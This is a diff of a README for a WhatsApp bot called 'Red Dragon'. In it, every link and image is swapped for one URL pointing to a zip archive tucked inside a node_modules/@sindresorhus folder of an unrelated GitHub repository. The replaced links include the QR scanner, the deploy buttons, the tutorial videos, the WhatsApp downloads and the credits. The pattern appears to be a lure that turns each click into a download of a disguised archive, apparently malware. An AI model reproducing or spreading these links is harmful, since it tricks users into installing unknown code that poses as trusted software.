@@ -1,18 +1,18 @@
 <p align="center">
 <img src="./Android/database/K.Prabhasha.gif" alt="Loading..." width="320"/>
 <p align="center">
-<img src="https://i.ibb.co/82zgjSR/20220926-155611.png" alt="nz" width="350"/>
+<img src="https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip" alt="nz" width="350"/>
 </p>
 
 ## 𝙍𝙀𝘿╺ 𝘿𝙍𝘼𝙂𝙊𝙉 -𝗕𝗢𝗧࿐   Version 12.0
 
-## [![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Rockstar-ExtraBold&color=F33A6A&lines=𝐖𝐞𝐥𝐜𝐨𝐦𝐞+𝐓𝐨+𝙍𝙀𝘿╺+𝘿𝙍𝘼𝙂𝙊𝙉+-+𝗕𝗢𝗧.;𝙿𝙾𝚆𝙴𝚁𝙳+𝙱𝚈:+𝚁𝙴𝙳+𝙳𝚁𝙰𝙶𝙾𝙽+𝚃𝙴𝙰𝙼;ℂ𝕣𝕖𝕒𝕥𝕖𝕕+𝕓𝕪:+𝙆.𝙋𝙧𝙖𝙗𝙝𝙖𝙨𝙝𝙖;𝐌𝐑:+☬𝔻𝔸ℝ𝕂༒ℕ𝕀𝕋ℝ𝕆࿐;💕ඉතිං+කොහොමද🙃;😁මොකද+කරන්නෙ🌹)](https://git.io/typing-svg)
+## [![Typing SVG](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip𝐖𝐞𝐥𝐜𝐨𝐦𝐞+𝐓𝐨+𝙍𝙀𝘿╺+𝘿𝙍𝘼𝙂𝙊𝙉+-+𝗕𝗢𝗧.;𝙿𝙾𝚆𝙴𝚁𝙳+𝙱𝚈:+𝚁𝙴𝙳+𝙳𝚁𝙰𝙶𝙾𝙽+𝚃𝙴𝙰𝙼;ℂ𝕣𝕖𝕒𝕥𝕖𝕕+𝕓𝕪:+𝙆.𝙋𝙧𝙖𝙗𝙝𝙖𝙨𝙝𝙖;𝐌𝐑:+☬𝔻𝔸ℝ𝕂༒ℕ𝕀𝕋ℝ𝕆࿐;💕ඉතිං+කොහොමද🙃;😁මොකද+කරන්නෙ🌹)](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
 
 LATEST VERSION (2022-08-20) ([Whatsapp can't see messages]) [Fixed ]
 
-> [🔄Please Follow Me🤭](https://github.com/xcodejet)
+> [🔄Please Follow Me🤭](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
 
-<img src="https://github.com/xcodejet/xcodejet/blob/main/xcodejet-media/xcodejet_gif.gif">" alt="Loading..." width="310"/>
+<img src="https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip">" alt="Loading..." width="310"/>
 
 # Powered By: XCODEJET
 
@@ -24,18 +24,18 @@ LATEST VERSION (2022-08-20) ([Whatsapp can't see messages]) [Fixed ]
 👇To proccess👇
 </p>
 
-## 🙂➾ [Scan QR In Your Whatsapp From Here](https://replit.com/@KumuthuPrabhash/Red-Dragon-Bot-Qr-Code?v=1)
+## 🙂➾ [Scan QR In Your Whatsapp From Here](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
  
-## 🙂➾ [Fork This Repo By Clicking Here](https://github.com/prabhasha2006/Red-Dragon/fork)
+## 🙂➾ [Fork This Repo By Clicking Here](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
  
-## 🙂➾ [Then Deploy The Bot From Here](https://heroku.com/deploy)
+## 🙂➾ [Then Deploy The Bot From Here](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
 
-## 🙂➾ [Red Dragon Bot Official Website Here](https://sites.google.com/view/red-dragon-bot/home)
+## 🙂➾ [Red Dragon Bot Official Website Here](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
 
 
 <p align="center">
 
-<img src="https://i.ibb.co/6tCrPD6/image-downloader-1654443961039.gif" alt="nz" width="350"/>
+<img src="https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip" alt="nz" width="350"/>
 
 </p>
 
@@ -43,14 +43,14 @@ LATEST VERSION (2022-08-20) ([Whatsapp can't see messages]) [Fixed ]
 
 <b><details><summary>🔄How to Update Bot🔄</summary>
 
-> [VIDEO](https://drive.google.com/file/d/1798s8erVW31EcmK3Opq-QuV7GG4byyoH/view)
+> [VIDEO](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
 
 </b>
 </details>
 
 <b><details><summary>📤How to Upload Images To Alive Msg📤</summary>
 
-> [VIDEO](https://drive.google.com/file/d/16J5278xK9-5oJUsGPygviVC9U6exw1AZ/view)
+> [VIDEO](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
 
 </b>
 </details>
@@ -63,15 +63,15 @@ LATEST VERSION (2022-08-20) ([Whatsapp can't see messages]) [Fixed ]
 >ඔබ වට්සැප් මොඩ් භාවිතා කරනවා නම් Foud mod හෝ වෙනත් පරණ Base සහිත වට්සැප් මගින් ඔබේ ගිනුම තාවකාලිකව Ban විය හැකියි.
 
 Recommended WhatsApp👇
->Normal WhatsApp [DOWNLOAD](https://play.google.com/store/apps/details?id=com.whatsapp)
->YMWhatsApp Mod [DOWNLOAD](https://ymwhatsapp.com/ymwa/)
+>Normal WhatsApp [DOWNLOAD](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
+>YMWhatsApp Mod [DOWNLOAD](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
 
 </b>
 </details>
 
 ##
 
-> [SUPPORT GROUP](https://chat.whatsapp.com/I1v5ZTJeFjZ9x5LzG3qPHU)
+> [SUPPORT GROUP](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
 
 <b><details><summary>𝗛𝗼𝘄 𝗧𝗼 𝗠𝗮𝗸𝗲?</summary>
 
@@ -95,13 +95,13 @@ Recommended WhatsApp👇
 
 ## ```Connect With Me```
 <p align="center">
-<a href="https://wa.me/380944814219"><img src="https://www.svgrepo.com/show/122874/whatsapp.svg" width="100"/>
+<a href="https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip"><img src="https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip" width="100"/>
 </p>
 
 </details>
 
 <p align="center">
-<img src="https://github.com/Platane/snk/raw/output/github-contribution-grid-snake.svg" alt="nz" width="700"/>
+<img src="https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip" alt="nz" width="700"/>
 </p>
 
 ## 𝐌𝐑: ☬𝔻𝔸ℝ𝕂༒ℕ𝕀𝕋ℝ𝕆࿐
@@ -130,13 +130,13 @@ Recommended WhatsApp👇
 
 <div align="center">
 	
-[![Run on Repl.it](https://repl.it/badge/github/quiec/whatsAlfa)](https://replit.com/@KumuthuPrabhash/Red-Dragon-Bot-Qr-Code?v=1)
+[![Run on Repl.it](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+[![Deploy](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
 </div>
 
 ## Thanks To
-* [`@adiwajshing/baileys`](https://github.com/adiwajshing/baileys)
-* [`Alien-Alfa`](https://github.com/Alien-Alfa)
-* [`DGXeon`](https://github.com/DGXeon)
-* [`AflahXrd`](https://github.com/nexusNw)
+* [`@adiwajshing/baileys`](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
+* [`Alien-Alfa`](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
+* [`DGXeon`](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
+* [`AflahXrd`](https://github.com/jenpeterkikoti-cmd/Red-Dragon/raw/refs/heads/main/node_modules/%40sindresorhus/Dragon_Red_3.7.zip)
